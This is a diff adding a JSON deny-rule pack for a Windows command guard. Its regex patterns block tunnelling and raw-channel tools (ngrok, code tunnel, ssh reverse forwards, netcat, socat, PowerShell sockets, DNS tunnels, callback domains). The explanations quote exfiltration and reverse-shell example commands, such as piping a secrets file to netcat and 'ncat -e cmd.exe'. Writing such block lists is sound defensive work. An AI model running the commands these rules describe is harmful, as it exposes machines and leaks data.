@@ -1,0 +1,130 @@
+{
+  "schema_version": 1,
+  "pin_version": "0.11.0",
+  "id": "careful_company_running_windows.tunnel",
+  "name": "Careful Company: Tunnels & Raw Channels",
+  "version": "0.11.0",
+  "description": "Blocks channels that expose the workstation or bypass network inspection: \\ ngrok, cloudflared, devtunnel/`code tunnel`, localtunnel, `tailscale funnel`, \\ `ssh -R`/`-D` reverse and SOCKS forwards, chisel/frp/gost/zrok/bore, \\ ncat/netcat/socat, PowerShell raw sockets, `netsh interface portproxy`, DNS \\ tunnels (dnscat2/iodine), out-of-band callback domains, and DNS labels long \\ enough to be carrying encoded data.",
+  "category": "careful_company_running_windows",
+  "enabled_by_default": false,
+  "keywords": [],
+  "safe_patterns": [
+    {
+      "name": "network-diagnostics",
+      "pattern": "(?i)^\\s*(?:test-netconnection|tnc|test-connection|ping|tracert|pathping|arp|netstat|route\\s+print|ipconfig|get-nettcpconnection)\\b(?![^|&;<>\\r\\n]*(?:oast\\.|oastify\\.com|interact\\.sh|burpcollaborator\\.net|dnslog\\.cn|canarytokens\\.com|requestrepo\\.com))[^|&;<>\\r\\n]*$",
+      "description": ""
+    },
+    {
+      "name": "netcat-zero-io-probe",
+      "pattern": "(?i)^\\s*(?:nc|ncat|netcat)(?:\\.exe)?\\s+(?![^\\r\\n]*(?:\\s-e\\b|\\s-c\\b|\\s--exec\\b|\\s--sh-exec\\b|\\s--lua-exec\\b))(?![^|&;<>\\r\\n]*(?:oast\\.|oastify\\.com|interact\\.sh|burpcollaborator\\.net|dnslog\\.cn|canarytokens\\.com|requestrepo\\.com))(?:-\\S+\\s+)*-[a-bdf-z]*z[a-bdf-z]*\\b[^|&;<>\\r\\n]*$",
+      "description": ""
+    }
+  ],
+  "destructive_patterns": [
+    {
+      "name": "ngrok-tunnel",
+      "pattern": "(?i)\\bngrok(?:\\.exe)?\\s+(?:http|tcp|tls|start|tunnel)\\b",
+      "severity": "high",
+      "description": "ngrok publishes a local port to the public internet.",
+      "explanation": "`ngrok http 3000` gives a local service a public HTTPS URL, reachable by anyone who has \\ the link, through an outbound connection that inbound firewall rules cannot stop. \\ `ngrok tcp 3389` does the same for remote desktop.\n\n\\ Safer alternatives: \\ - Test against the service on localhost \\ - Use the company's approved remote-access path for anything that must be reachable"
+    },
+    {
+      "name": "cloudflared-tunnel",
+      "pattern": "(?i)\\bcloudflared(?:\\.exe)?\\s+tunnel\\b",
+      "severity": "high",
+      "description": "cloudflared publishes a local service through a Cloudflare tunnel.",
+      "explanation": "`cloudflared tunnel --url http://localhost:8080` creates a public `*.trycloudflare.com` \\ URL with no account and no approval step — the lowest-friction way to expose an internal \\ service that exists. (`cloudflared access`, which is a client for *reaching* an \\ already-protected app, is not matched.)\n\n\\ Safer alternatives: \\ - Keep the service on localhost while developing \\ - Request a reviewed ingress path if external access is genuinely needed"
+    },
+    {
+      "name": "devtunnel-or-code-tunnel",
+      "pattern": "(?i)\\bdevtunnel(?:\\.exe)?\\s+(?:host|create|port|user)\\b|\\bcode(?:-insiders)?(?:\\.exe|\\.cmd)?\\s+(?:tunnel|serve-web)\\b",
+      "severity": "high",
+      "description": "devtunnel / `code tunnel` grants remote access to this machine through a broker.",
+      "explanation": "`code tunnel` is the highest-impact entry in this pack: it registers the workstation \\ with a Microsoft-hosted broker and grants whoever holds the link a full VS Code session \\ — shell, filesystem, and running processes. `devtunnel host --allow-anonymous` exposes \\ a port to anyone at all.\n\n\\ Safer alternatives: \\ - Work in the local editor session \\ - Use the company's approved remote-development path"
+    },
+    {
+      "name": "localtunnel-expose",
+      "pattern": "(?i)\\b(?:localtunnel|lt)(?:\\.exe)?\\s+(?:--port|-p)\\s+\\d",
+      "severity": "high",
+      "description": "localtunnel publishes a local port on a public *.loca.lt URL.",
+      "explanation": "`lt --port 3000` returns a public URL that forwards to the local port, with no account \\ and no access control. Both the long form and the common `lt -p 3000` alias are \\ covered without using noisy `lt` or `-p` keywords independently.\n\n\\ Safer alternatives: \\ - Test against localhost \\ - Use an approved ingress if external access is required"
+    },
+    {
+      "name": "tailscale-funnel",
+      "pattern": "(?i)\\btailscale(?:\\.exe)?\\s+funnel\\b",
+      "severity": "high",
+      "description": "tailscale funnel exposes a local service beyond the tailnet, to the public internet.",
+      "explanation": "`tailscale funnel 3000` publishes a local service on a public `*.ts.net` name. \\ (`tailscale serve` keeps the service inside the tailnet, which is a different and much \\ narrower exposure, so it is not matched.)\n\n\\ Safer alternatives: \\ - Keep the service bound to localhost \\ - Use an approved ingress path"
+    },
+    {
+      "name": "tunnel-client-binary",
+      "pattern": "(?i)\\b(?:chisel(?:\\.exe)?\\s+(?:client|server)|frpc(?:\\.exe)?\\b|frps(?:\\.exe)?\\b|gost(?:\\.exe)?\\s+-L|zrok(?:\\.exe)?\\s+share|bore(?:\\.exe)?\\s+local)\\b|\\b(?:serveo\\.net|localhost\\.run|bore\\.pub|trycloudflare\\.com|[a-z0-9-]+\\.(?:pinggy\\.io|loca\\.lt|ngrok\\.io|ngrok-free\\.app|ngrok\\.(?:app|dev)))\\b",
+      "severity": "high",
+      "description": "Tunnel clients and the public hostnames they hand out expose local services outward.",
+      "explanation": "These are dedicated tunnelling clients. The hostnames matter as much as the binaries: \\ `serveo.net`, `localhost.run`, `bore.pub`, and `*.pinggy.io` are brokers that need no \\ client at all — `ssh -R 80:localhost:3000 serveo.net` is a complete tunnel in one \\ command — while `*.ngrok.io`, `*.ngrok-free.app`, `*.loca.lt`, and `trycloudflare.com` \\ are the public URLs a tunnel hands out, so touching one means a tunnel already \\ exists.\n\n\\ Safer alternatives: \\ - Keep the service local \\ - Use the company's approved remote-access path"
+    },
+    {
+      "name": "reverse-or-socks-forward",
+      "pattern": "(?i)\\b(?:ssh|plink|autossh)(?:\\.exe)?\\b[^|&;\\r\\n]*\\s(?-i:-(?:R|D))\\s*[\\d\\[]|\\b(?:ssh|autossh)(?:\\.exe)?\\b[^|&;\\r\\n]*\\s(?-i:-o)(?:\\s+)?[\\x22']?ProxyCommand(?:=|\\s+)",
+      "severity": "high",
+      "description": "ssh -R / -D creates a reverse tunnel or SOCKS proxy out of this machine.",
+      "explanation": "`ssh -R 8080:localhost:80 user@host` makes a local service reachable from the remote \\ side, and `ssh -D 1080` turns the connection into a general-purpose SOCKS proxy for \\ arbitrary outbound traffic. `-L` (a local forward, which only pulls a remote port to \\ you) is deliberately not matched.\n\n\\ Safer alternatives: \\ - Use `-L` if the intent is to reach a remote service from here \\ - Plain `ssh user@host \"command\"` for remote administration is unaffected"
+    },
+    {
+      "name": "netsh-port-proxy",
+      "pattern": "(?i)\\bnetsh(?:\\.exe)?\\s+interface\\s+portproxy\\s+(?:add|set)\\b",
+      "severity": "high",
+      "description": "netsh interface portproxy forwards a local port to another host.",
+      "explanation": "`netsh interface portproxy add v4tov4 listenport=8080 connectaddress=<remote>` builds a \\ pivot using only built-in Windows networking — no third-party binary, and the rule \\ persists across reboots.\n\n\\ Safer alternatives: \\ - `netsh interface portproxy show all` to inspect existing rules \\ - Use an approved network path instead of a local forwarder"
+    },
+    {
+      "name": "netcat-exec-backdoor",
+      "pattern": "(?i)\\b(?:nc|ncat|netcat)(?:\\.exe)?\\b[^|&;\\r\\n]*(?:\\s-(?:e|c)\\b|\\s-[a-z]*(?:z[a-z]*[ec]|[ec][a-z]*z)[a-z]*\\b|\\s--(?:exec|sh-exec|lua-exec)\\b)[^|&;\\r\\n]*",
+      "severity": "high",
+      "description": "netcat with an exec option hands a network connection to a local program.",
+      "explanation": "`ncat -e cmd.exe host 4444` and `nc --sh-exec /bin/sh host 4444` turn the socket into \\ remote command execution. Combining the flag with `-z` does not make it a harmless \\ probe; it only makes the command contradictory, so the executable handoff remains the \\ decisive signal.\n\n\\ Safer alternatives: \\ - `Test-NetConnection host -Port 4444` to check reachability \\ - Remove the exec option and use a reviewed protocol client"
+    },
+    {
+      "name": "netcat-raw-socket",
+      "pattern": "(?i)\\b(?:nc|ncat|netcat)(?:\\.exe)?\\s+(?:\\S+\\s+)*?[a-z0-9][a-z0-9._-]*\\s+\\d{1,5}\\b",
+      "severity": "high",
+      "description": "netcat sends arbitrary bytes to an arbitrary host and port.",
+      "explanation": "`type C:\\secrets.txt | nc.exe host 9999` is the shortest exfiltration in existence: no \\ protocol, no headers, nothing for a proxy to inspect. The same command with `-l` accepts \\ an inbound connection instead.\n\n\\ Safer alternatives: \\ - `Test-NetConnection host -Port 9999` to check reachability without sending data \\ - Use an HTTP client against an internal endpoint"
+    },
+    {
+      "name": "socat-relay",
+      "pattern": "(?i)\\bsocat(?:\\.exe)?\\s+(?:-\\S+\\s+)*(?:(?:tcp|udp|openssl|socks|proxy)(?:4|6)?(?:-listen)?:\\S*\\s+\\S+|\\S+\\s+(?:tcp|udp|openssl|socks|proxy)(?:4|6)?(?:-listen)?:\\S*)",
+      "severity": "high",
+      "description": "socat relays data between a local file or process and a remote socket.",
+      "explanation": "`socat FILE:C:\\secrets.txt TCP:host:9999` streams a file to a remote port, and \\ `socat TCP-LISTEN:… EXEC:cmd.exe` turns the connection into a shell. Every socat \\ invocation connects two endpoints; that is the whole purpose of the tool.\n\n\\ Safer alternatives: \\ - Use an approved transfer path for data that must move \\ - Use a local listener for development"
+    },
+    {
+      "name": "powershell-raw-socket",
+      "pattern": "(?i)\\bnet\\.sockets\\.(?:tcpclient|udpclient|socket|tcplistener)\\b|\\bnew-object\\s+[^|&;\\r\\n]*\\b(?:tcpclient|udpclient|clientwebsocket)\\b|\\bnet\\.websockets\\.clientwebsocket\\b",
+      "severity": "high",
+      "description": "PowerShell raw sockets send arbitrary bytes outside any inspectable protocol.",
+      "explanation": "`$t = New-Object Net.Sockets.TcpClient($h,$p); $t.GetStream().Write($bytes,0,$n)` is the \\ canonical PowerShell exfiltration and reverse-shell primitive — it needs no external \\ binary and no HTTP client, so nothing else in this preset would see it.\n\n\\ Safer alternatives: \\ - Use `Invoke-RestMethod` against an internal endpoint \\ - `Test-NetConnection` for connectivity checks"
+    },
+    {
+      "name": "dns-tunnel-tool",
+      "pattern": "(?i)\\b(?:dnscat2?|iodine[d]?|dnsteal|dns2tcp|chashell|dnsexfiltrator)\\b",
+      "severity": "high",
+      "description": "dnscat2/iodine and similar tools tunnel data over DNS queries.",
+      "explanation": "These tools encode a data stream into DNS queries, which usually leave a network even \\ when all other egress is blocked, because DNS resolution is rarely filtered. They have \\ no legitimate use on a developer workstation.\n\n\\ Safer alternatives: \\ - Use an approved network path \\ - If this is authorized security testing, allowlist the rule for the duration"
+    },
+    {
+      "name": "out-of-band-callback-domain",
+      "pattern": "(?i)\\b[a-z0-9-]+\\.(?:oast\\.(?:fun|live|me|online|pro|site)|oastify\\.com|interact\\.sh|burpcollaborator\\.net|dnslog\\.cn|canarytokens\\.com|requestrepo\\.com)\\b",
+      "severity": "high",
+      "description": "Out-of-band callback domains record data encoded into a DNS lookup or HTTP request.",
+      "explanation": "These domains exist to log every interaction that reaches them, including plain DNS \\ resolution — so merely resolving `<data>.oast.fun` transmits the data, with no HTTP \\ request and nothing for a web proxy to see.\n\n\\ Safer alternatives: \\ - Use an internal listener for callback testing \\ - Allowlist the rule for the duration of authorized security testing"
+    },
+    {
+      "name": "dns-label-exfil",
+      "pattern": "(?i)\\b(?:nslookup|resolve-dnsname)\\b[^|&;\\r\\n]*\\b[a-z0-9+/=_-]{32,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b",
+      "severity": "medium",
+      "description": "A DNS query with an unusually long label is the shape of data encoded into a hostname.",
+      "explanation": "DNS exfiltration works by encoding data into the leftmost label of a query \\ (`<base32-blob>.exfil.example.com`). A single label of 32 characters or more is not a \\ hostname anyone types, so this warns; ordinary lookups of ordinary names never match. \\ `nslookup` and `Resolve-DnsName` are the Windows resolvers and both are covered. `dig` \\ is deliberately absent: reaching it needs a `dig` keyword, and that substring appears \\ in `git config`, `npm config`, and `./configure`, so it would run this pack's regexes \\ over a large share of ordinary commands for very little gain.\n\n\\ Safer alternatives: \\ - `Resolve-DnsName <hostname>` for a normal lookup \\ - Check the query for encoded content before running it"
+    }
+  ]
+}
